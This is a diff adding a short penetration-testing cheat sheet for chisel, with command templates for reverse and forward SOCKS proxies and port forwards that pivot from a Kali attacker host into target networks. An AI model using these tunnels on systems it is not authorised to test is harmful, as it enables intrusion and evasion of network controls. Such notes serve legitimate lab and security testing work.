@@ -1,0 +1,20 @@
+% chisel
+
+# reverse SOCKS proxy (kali is server)
+./chisel server -p <LPORT> --reverse &
+./chisel client <KALI_IP>:<LPORT> R:socks &
+
+# forward SOCKS proxy (kali is client)
+./chisel server -p <LISTEN_PORT> --socks5
+./chisel client <TARGET_IP>:<LISTEN_PORT> <KALI_PORT>:socks
+
+# remote port forward (kali is server)
+./chisel server -p <LPORT> --reverse &
+./chisel client <KALI_IP>:<LPORT> R:<ANY_LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> &
+curl localhost:<ANY_LOCAL_PORT>
+
+# local port forward (kali is client)
+./chisel server -p <PIVOT_PORT>
+./chisel client <PIVOT_IP>:<PIVOT_PORT> <ANY_LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT>
+
+$ KALI_IP: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
